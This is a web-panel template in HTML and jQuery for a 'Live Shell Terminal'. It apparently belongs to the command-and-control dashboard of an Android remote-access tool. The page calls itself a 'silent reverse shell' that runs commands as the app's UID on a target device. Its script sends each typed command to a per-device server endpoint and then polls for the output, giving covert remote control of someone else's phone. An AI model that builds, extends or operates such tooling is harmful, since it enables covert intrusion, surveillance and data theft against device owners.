<style>
    #term-container { background: #0d1117; border-radius: 8px; overflow: hidden; font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace; font-size: 13px; border: 1px solid #21262d; }
    #term-output { height: 420px; overflow-y: auto; padding: 16px; color: #c9d1d9; white-space: pre-wrap; word-break: break-all; }
    #term-output .cmd-line { color: #58a6ff; }
    #term-output .out-line { color: #c9d1d9; }
    #term-output .err-line { color: #f85149; }
    #term-input-area { display: flex; align-items: center; background: #161b22; padding: 10px 14px; border-top: 1px solid #21262d; }
    #term-input-area .prompt { color: #3fb950; margin-right: 8px; white-space: nowrap; font-weight: bold; }
    #term-input { flex: 1; background: transparent; border: none; color: #c9d1d9; font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace; font-size: 13px; outline: none; }
    #term-input::placeholder { color: #484f58; }
    #term-status { font-size: 11px; color: #8b949e; padding: 6px 14px; background: #161b22; border-top: 1px solid #21262d; }
</style>

<div class="flex items-center justify-between mb-4">
    <h3 class="text-white font-semibold text-lg flex items-center gap-2">
        <svg class="w-5 h-5 text-accent-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
        Live Shell Terminal
    </h3>
    <div class="flex items-center gap-2">
        <button class="btn-ghost text-xs" onclick="resetTerm()"><svg class="w-3 h-3 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg> Reset</button>
        <span class="text-slate-500 text-xs">Working dir: <code class="bg-slate-800 px-1.5 py-0.5 rounded">/</code></span>
    </div>
</div>

<div id="term-container">
    <div id="term-output">
        <div class="cmd-line"># Android Shell Terminal</div>
        <div class="out-line"># Silent reverse shell — commands run as app UID.</div>
        <div class="out-line"># Use toybox commands: ls, cat, id, pm, etc.</div>
        <div class="out-line"></div>
    </div>
    <div id="term-input-area">
        <span class="prompt" id="term-prompt">/ $</span>
        <input type="text" id="term-input" placeholder="Type command..." autofocus autocomplete="off">
        <button onclick="sendTermCmd()" class="ml-2 px-3 py-1 bg-accent-green text-white text-xs rounded hover:bg-green-600 transition-colors">Run</button>
    </div>
    <div id="term-status">Ready</div>
</div>

<script>
    var deviceID = '<%= deviceID %>';
    var cmdHistory = [];
    var histIdx = -1;
    var pollInterval;

    function appendOutput(text, cls) {
        var out = document.getElementById('term-output');
        var div = document.createElement('div');
        div.className = cls || 'out-line';
        div.textContent = text;
        out.appendChild(div);
        out.scrollTop = out.scrollHeight;
    }
    function updateCwd(cwd) {
        document.getElementById('term-prompt').textContent = (cwd === '/' ? '/' : cwd) + ' $';
    }
    function pollOutput() {
        $.get('/term/' + deviceID + '/shell/output', function(d) {
            if (d.entries && d.entries.length > 0) {
                d.entries.forEach(function(e) {
                    var cmd = e.command || '';
                    var m = cmd.match(/^cd\s+"[^"]*"\s*&&\s*(.+)/);
                    if (m) cmd = m[1];
                    if (cmd) appendOutput('$ ' + cmd, 'cmd-line');
                    if (e.output) appendOutput(e.output, 'out-line');
                });
            }
            if (d.cwd) updateCwd(d.cwd);
        });
    }
    function sendTermCmd() {
        var inp = document.getElementById('term-input');
        var cmd = inp.value.trim();
        if (!cmd) return;
        cmdHistory.push(cmd);
        histIdx = cmdHistory.length;
        appendOutput('$ ' + cmd, 'cmd-line');
        document.getElementById('term-status').textContent = 'Running: ' + cmd + '...';
        inp.value = '';
        $.post('/shell/term/' + deviceID + '/cmd', { cmd: cmd }, function(d) {
            if (d.error) { appendOutput('Error: ' + d.error, 'err-line'); document.getElementById('term-status').textContent = 'Error'; }
            else { document.getElementById('term-status').textContent = 'Sent'; if (d.cwd) updateCwd(d.cwd); setTimeout(pollOutput, 800); setTimeout(pollOutput, 1600); }
        });
    }
    function resetTerm() {
        $.post('/term/' + deviceID + '/shell/reset', function(d) {
            document.getElementById('term-output').innerHTML = '<div class="out-line"># Session reset</div>';
            updateCwd(d.cwd || '/');
        });
    }
    $(function() {
        document.getElementById('term-input').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') sendTermCmd();
            else if (e.key === 'ArrowUp') { e.preventDefault(); if (histIdx > 0) { histIdx--; this.value = cmdHistory[histIdx]; } }
            else if (e.key === 'ArrowDown') { e.preventDefault(); if (histIdx < cmdHistory.length - 1) { histIdx++; this.value = cmdHistory[histIdx]; } else { histIdx = cmdHistory.length; this.value = ''; } }
        });
        pollInterval = setInterval(pollOutput, 500);
        pollOutput();
    });
</script>
